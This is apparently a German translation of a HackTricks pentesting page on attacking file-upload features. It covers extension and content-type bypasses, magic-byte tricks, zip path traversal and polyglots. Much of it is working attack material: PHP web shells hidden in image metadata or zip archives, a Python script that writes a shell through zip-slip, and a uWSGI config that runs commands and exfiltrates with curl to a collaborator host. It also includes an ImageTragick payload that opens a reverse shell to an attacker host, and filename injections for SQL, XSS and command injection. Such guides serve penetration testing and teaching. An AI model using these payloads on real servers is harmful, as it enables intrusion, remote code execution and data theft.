# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik für Datei-Uploads

Weitere nützliche Erweiterungen:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Arbeiten in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehung von Überprüfungen der Dateierweiterungen

1. Wenn sie zutreffen, **überprüfen** Sie die **vorherigen Erweiterungen.** Testen Sie sie auch mit einigen **Großbuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _Überprüfen Sie **das Hinzufügen einer gültigen Erweiterung vor** der Ausführungs-Erweiterung (verwenden Sie auch vorherige Erweiterungen):_
- _file.png.php_
- _file.png.Php5_
3. Versuchen Sie, **Sonderzeichen am Ende hinzuzufügen.** Sie könnten Burp verwenden, um alle **ASCII**- und **Unicode**-Zeichen zu **bruteforcen**. (_Beachten Sie, dass Sie auch die **vorher** genannten **Erweiterungen** verwenden können_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuchen Sie, die Schutzmaßnahmen **zu umgehen, indem Sie den Erweiterungsparser** des Servers mit Techniken wie **Verdopplung** der **Erweiterung** oder **Hinzufügen von Junk**-Daten (**null** Bytes) zwischen den Erweiterungen täuschen. _Sie können auch die **vorherigen Erweiterungen** verwenden, um eine bessere Payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Fügen Sie **eine weitere Ebene von Erweiterungen** zur vorherigen Überprüfung hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuchen Sie, die **exec-Erweiterung vor der gültigen Erweiterung** zu setzen und beten Sie, dass der Server falsch konfiguriert ist. (nützlich zur Ausnutzung von Apache-Misconfigurationen, bei denen alles mit der Erweiterung **_**.php**_**, aber nicht unbedingt endend in .php** Code ausführt):
- _ex: file.php.png_
7. Verwenden von **NTFS-Alternativdatenstrom (ADS)** in **Windows**. In diesem Fall wird ein Doppelpunktzeichen “:” nach einer verbotenen Erweiterung und vor einer erlaubten eingefügt. Infolgedessen wird eine **leere Datei mit der verbotenen Erweiterung** auf dem Server erstellt (z.B. “file.asax:.jpg”). Diese Datei könnte später mit anderen Techniken bearbeitet werden, z.B. mit ihrem kurzen Dateinamen. Das Muster “**::$data**” kann auch verwendet werden, um nicht leere Dateien zu erstellen. Daher kann das Hinzufügen eines Punktzeichens nach diesem Muster auch nützlich sein, um weitere Einschränkungen zu umgehen (z.B. “file.asp::$data.”)
8. Versuchen Sie, die Dateinamenlimits zu brechen. Die gültige Erweiterung wird abgeschnitten. Und das bösartige PHP bleibt. AAA<--SNIP-->AAA.php

```
# Linux maximal 255 Bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ab3Ab4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 hier und .png hinzufügen
# Laden Sie die Datei hoch und überprüfen Sie die Antwort, wie viele Zeichen sie zulässt. Angenommen 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Erstellen Sie die Payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Umgehung von Content-Type, Magic Number, Kompression & Größenänderung

- Umgehung der **Content-Type**-Überprüfungen, indem Sie den **Wert** des **Content-Type** **Headers** auf: _image/png_, _text/plain_, application/octet-stream_ setzen.
1. Content-Type **Wortliste**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Umgehung der **Magic Number**-Überprüfung, indem Sie am Anfang der Datei die **Bytes eines echten Bildes** hinzufügen (verwirren Sie den _file_ Befehl). Oder führen Sie die Shell in die **Metadaten** ein:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder Sie könnten auch **die Payload direkt** in ein Bild einfügen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Wenn **Kompression zu Ihrem Bild hinzugefügt wird**, zum Beispiel mit einigen Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), werden die vorherigen Techniken nicht nützlich sein. Sie könnten jedoch die **PLTE-Chunks** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um etwas Text einzufügen, der **Kompression übersteht**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webseite könnte auch das **Bild** **verkleinern**, indem sie beispielsweise die PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled` verwendet. Sie könnten jedoch die **IDAT-Chunks** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um etwas Text einzufügen, der **Kompression übersteht**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um eine Payload zu erstellen, die **eine Größenänderung eines Bildes übersteht**, verwendet die PHP-GD-Funktion `thumbnailImage`. Sie könnten jedoch die **tEXt-Chunks** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um etwas Text einzufügen, der **Kompression übersteht**.
- [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks zur Überprüfung

- Finden Sie eine Schwachstelle, um die Datei, die bereits hochgeladen wurde, **umzubenennen** (um die Erweiterung zu ändern).
- Finden Sie eine **Local File Inclusion**-Schwachstelle, um das Backdoor auszuführen.
- **Mögliche Informationsoffenlegung**:
1. Laden Sie **mehrmals** (und zur **gleichen Zeit**) die **gleiche Datei** mit dem **gleichen Namen** hoch.
2. Laden Sie eine Datei mit dem **Namen** einer **Datei** oder **Ordners**, der **bereits existiert**.
3. Laden Sie eine Datei mit **“.”, “..” oder “…” als Namen** hoch. Zum Beispiel, in Apache in **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis “/www/uploads/” speichert, wird der Dateiname “.” eine Datei namens “uploads” im Verzeichnis “/www/” erstellen.
4. Laden Sie eine Datei hoch, die möglicherweise nicht leicht gelöscht werden kann, wie **“…:.jpg”** in **NTFS**. (Windows)
5. Laden Sie eine Datei in **Windows** mit **ungültigen Zeichen** wie `|<>*?”` in ihrem Namen hoch. (Windows)
6. Laden Sie eine Datei in **Windows** mit **reservierten** (**verbotenen**) **Namen** wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9 hoch.
- Versuchen Sie auch, eine **ausführbare** Datei (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die **Code ausführt**, wenn sie versehentlich vom Opfer geöffnet wird.

### Besondere Erweiterungstricks

Wenn Sie versuchen, Dateien auf einen **PHP-Server** hochzuladen, [sehen Sie sich den **.htaccess**-Trick an, um Code auszuführen](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Wenn Sie versuchen, Dateien auf einen **ASP-Server** hochzuladen, [sehen Sie sich den **.config**-Trick an, um Code auszuführen](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar`-Dateien sind wie die `.jar` für Java, aber für PHP, und können **wie eine PHP-Datei verwendet werden** (indem sie mit PHP ausgeführt oder in ein Skript eingebunden werden...)

Die `.inc`-Erweiterung wird manchmal für PHP-Dateien verwendet, die nur zum **Importieren von Dateien** verwendet werden, sodass jemand zu einem bestimmten Zeitpunkt **diese Erweiterung zur Ausführung** zulassen könnte.

## **Jetty RCE**

Wenn Sie eine XML-Datei auf einen Jetty-Server hochladen können, können Sie [RCE erhalten, weil **neue \*.xml und \*.war automatisch verarbeitet werden**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Wie im folgenden Bild erwähnt, laden Sie die XML-Datei in `$JETTY_BASE/webapps/` hoch und erwarten Sie die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Für eine detaillierte Untersuchung dieser Schwachstelle überprüfen Sie die ursprüngliche Forschung: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) Schwachstellen können in uWSGI-Servern ausgenutzt werden, wenn man die Möglichkeit hat, die `.ini`-Konfigurationsdatei zu ändern. uWSGI-Konfigurationsdateien nutzen eine spezifische Syntax, um "magische" Variablen, Platzhalter und Operatoren einzufügen. Besonders bemerkenswert ist der '@'-Operator, der als `@(filename)` verwendet wird, um den Inhalt einer Datei einzufügen. Unter den verschiedenen unterstützten Schemas in uWSGI ist das "exec"-Schema besonders mächtig, da es das Lesen von Daten aus dem Standardausgang eines Prozesses ermöglicht. Diese Funktion kann für böswillige Zwecke wie Remote Command Execution oder Arbitrary File Write/Read manipuliert werden, wenn eine `.ini`-Konfigurationsdatei verarbeitet wird.

Betrachten Sie das folgende Beispiel einer schädlichen `uwsgi.ini`-Datei, die verschiedene Schemas zeigt:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des Payloads erfolgt während des Parsens der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst werden kann, muss der uWSGI-Prozess entweder neu gestartet werden (möglicherweise nach einem Absturz oder aufgrund eines Denial of Service-Angriffs) oder die Datei muss auf automatisches Neuladen eingestellt werden. Die Auto-Reload-Funktion, wenn aktiviert, lädt die Datei in festgelegten Intervallen neu, wenn Änderungen erkannt werden.

Es ist entscheidend, die nachlässige Natur des Parsens der Konfigurationsdatei von uWSGI zu verstehen. Insbesondere kann der besprochene Payload in eine Binärdatei (wie ein Bild oder PDF) eingefügt werden, was den Umfang potenzieller Ausnutzung weiter erweitert.

## **wget File Upload/SSRF Trick**

In einigen Fällen kann es vorkommen, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen**, und Sie können die **URL** **angeben**. In diesen Fällen überprüft der Code möglicherweise, ob die Erweiterung der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. Diese **Überprüfung kann jedoch umgangen werden.**\
Die **maximale** Länge eines **Dateinamens** in **linux** beträgt **255**, jedoch kürzt **wget** die Dateinamen auf **236** Zeichen. Sie können eine Datei mit dem Namen **"A"\*232+".php"+".gif"** **herunterladen**, dieser Dateiname wird die **Überprüfung umgehen** (da in diesem Beispiel **".gif"** eine **gültige** Erweiterung ist), aber `wget` wird die Datei in **"A"\*232+".php"** **umbenennen**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachten Sie, dass **eine andere Option**, an die Sie denken könnten, um diese Überprüfung zu umgehen, darin besteht, den **HTTP-Server auf eine andere Datei umzuleiten**, sodass die ursprüngliche URL die Überprüfung umgeht und wget die umgeleitete Datei mit dem neuen Namen herunterlädt. Dies **funktioniert nicht** **es sei denn**, wget wird mit dem **Parameter** `--trust-server-names` verwendet, da **wget die umgeleitete Seite mit dem Namen der Datei herunterlädt, die in der ursprünglichen URL angegeben ist**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ist ein leistungsstarkes Tool, das Pentestern und Bug-Huntern hilft, Datei-Upload-Mechanismen zu testen. Es nutzt verschiedene Bug-Bounty-Techniken, um den Prozess der Identifizierung und Ausnutzung von Schwachstellen zu vereinfachen und gründliche Bewertungen von Webanwendungen sicherzustellen.

## Vom Datei-Upload zu anderen Schwachstellen

- Setzen Sie **filename** auf `../../../tmp/lol.png` und versuchen Sie, eine **Pfad Traversierung** zu erreichen.
- Setzen Sie **filename** auf `sleep(10)-- -.jpg` und Sie könnten in der Lage sein, eine **SQL-Injection** zu erreichen.
- Setzen Sie **filename** auf `<svg onload=alert(document.domain)>`, um eine XSS zu erreichen.
- Setzen Sie **filename** auf `; sleep 10;`, um einige Befehlsinjektionen zu testen (mehr [Befehlsinjektions-Tricks hier](../command-injection.md)).
- [**XSS** beim Hochladen von Bild (svg) Dateien](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** Datei **Upload** + **XSS** = [**Service Workers** Ausnutzung](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg Upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** durch Hochladen einer svg-Datei](../open-redirect.md#open-redirect-uploading-svg-files)
- Versuchen Sie **verschiedene svg Payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
- [Berühmte **ImageTrick** Schwachstelle](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Wenn Sie **den Webserver anweisen können, ein Bild von einer URL abzurufen**, könnten Sie versuchen, eine [SSRF](../ssrf-server-side-request-forgery/index.html) auszunutzen. Wenn dieses **Bild** auf einer **öffentlichen** Seite **gespeichert** wird, könnten Sie auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und **Informationen von jedem Besucher stehlen**.
- [**XXE und CORS** Umgehung mit PDF-Adobe Upload](pdf-upload-xxe-and-cors-bypass.md)
- Speziell gestaltete PDFs für XSS: Die [folgende Seite zeigt, wie man **PDF-Daten injiziert, um JS-Ausführung zu erhalten**](../xss-cross-site-scripting/pdf-injection.md). Wenn Sie PDFs hochladen können, könnten Sie einige PDFs vorbereiten, die beliebiges JS ausführen, gemäß den gegebenen Anweisungen.
- Laden Sie den \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) Inhalt hoch, um zu überprüfen, ob der Server ein **Antivirus** hat.
- Überprüfen Sie, ob es eine **Größenbeschränkung** beim Hochladen von Dateien gibt.

Hier ist eine Top-10-Liste von Dingen, die Sie durch Hochladen erreichen können (von [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV-Injektion
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML-Injektion / XSS / Open Redirect
8. **PNG / JPEG**: Pixel Flood Attack (DoS)
9. **ZIP**: RCE über LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp-Erweiterung

{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magische Header-Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Verweisen Sie auf [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) für andere Dateitypen.

### Zip/Tar-Datei automatisch dekomprimiert hochladen

Wenn Sie eine ZIP-Datei hochladen können, die auf dem Server dekomprimiert wird, können Sie 2 Dinge tun:

#### Symlink

Laden Sie einen Link hoch, der symbolische Links zu anderen Dateien enthält. Dann, beim Zugriff auf die dekomprimierten Dateien, werden Sie auf die verlinkten Dateien zugreifen:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

Die unerwartete Erstellung von Dateien in Verzeichnissen während der Dekompression ist ein erhebliches Problem. Trotz anfänglicher Annahmen, dass dieses Setup möglicherweise vor der Ausführung von OS-Befehlen durch bösartige Datei-Uploads schützt, können die hierarchische Unterstützung für Kompression und die Verzeichnisdurchquerungsfähigkeiten des ZIP-Archivformats ausgenutzt werden. Dies ermöglicht Angreifern, Einschränkungen zu umgehen und sichere Upload-Verzeichnisse zu verlassen, indem sie die Dekompressionsfunktionalität der angegriffenen Anwendung manipulieren.

Ein automatisierter Exploit zum Erstellen solcher Dateien ist verfügbar unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Das Dienstprogramm kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zusätzlich ist der **Symlink-Trick mit evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzuvisieren, sollte ein Symlink zu dieser Datei in Ihrem System erstellt werden. Dies stellt sicher, dass evilarc während seiner Ausführung keine Fehler auftritt.

Unten ist ein Beispiel für Python-Code, der verwendet wird, um eine bösartige Zip-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Missbrauch von Kompression für File Spraying**

Für weitere Details **überprüfen Sie den Originalbeitrag in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Erstellen einer PHP-Shell**: PHP-Code wird geschrieben, um Befehle auszuführen, die über die `$_REQUEST`-Variable übergeben werden.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying und Erstellung komprimierter Dateien**: Mehrere Dateien werden erstellt und ein Zip-Archiv wird zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Änderung mit einem Hex-Editor oder vi**: Die Namen der Dateien im Zip werden mit vi oder einem Hex-Editor geändert, wobei "xxA" in "../" geändert wird, um Verzeichnisse zu durchlaufen.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Laden Sie diesen Inhalt mit einer Bilddateiendung hoch, um die Schwachstelle auszunutzen **(ImageMagick , 7.0.1-1)** (aus dem [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP-Shell in PNG

Das Einbetten einer PHP-Shell im IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` aus PHP-GD sind in diesem Zusammenhang besonders relevant, da sie häufig zum Verkleinern und Resampling von Bildern verwendet werden. Die Fähigkeit der eingebetteten PHP-Shell, von diesen Operationen unberührt zu bleiben, ist ein erheblicher Vorteil für bestimmte Anwendungsfälle.

Eine detaillierte Erkundung dieser Technik, einschließlich ihrer Methodik und potenzieller Anwendungen, wird im folgenden Artikel bereitgestellt: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Prozesses und seiner Implikationen.

Weitere Informationen unter: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-Dateien

Polyglot-Dateien dienen als einzigartiges Werkzeug in der Cybersicherheit und fungieren als Chamäleons, die gleichzeitig in mehreren Dateiformaten gültig existieren können. Ein faszinierendes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien sind nicht auf diese Kombination beschränkt; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Hauptnutzen von Polyglot-Dateien liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien basierend auf ihrem Typ überprüfen. Übliche Praktiken in verschiedenen Anwendungen erlauben nur bestimmte Dateitypen zum Hochladen—wie JPEG, GIF oder DOC—um das Risiko potenziell schädlicher Formate (z. B. JS, PHP oder Phar-Dateien) zu mindern. Ein Polyglot kann jedoch, indem es den strukturellen Kriterien mehrerer Dateitypen entspricht, diese Einschränkungen heimlich umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Einschränkungen. Zum Beispiel könnte der Erfolg des Hochladens eines Polyglots, das gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG verkörpert, von den Richtlinien der Plattform bezüglich der Dateiendungen abhängen. Wenn das System strenge Vorgaben für zulässige Erweiterungen hat, könnte die bloße strukturelle Dualität eines Polyglots nicht ausreichen, um sein Hochladen zu garantieren.

Weitere Informationen unter: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referenzen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

{{#include ../../banners/hacktricks-training.md}}
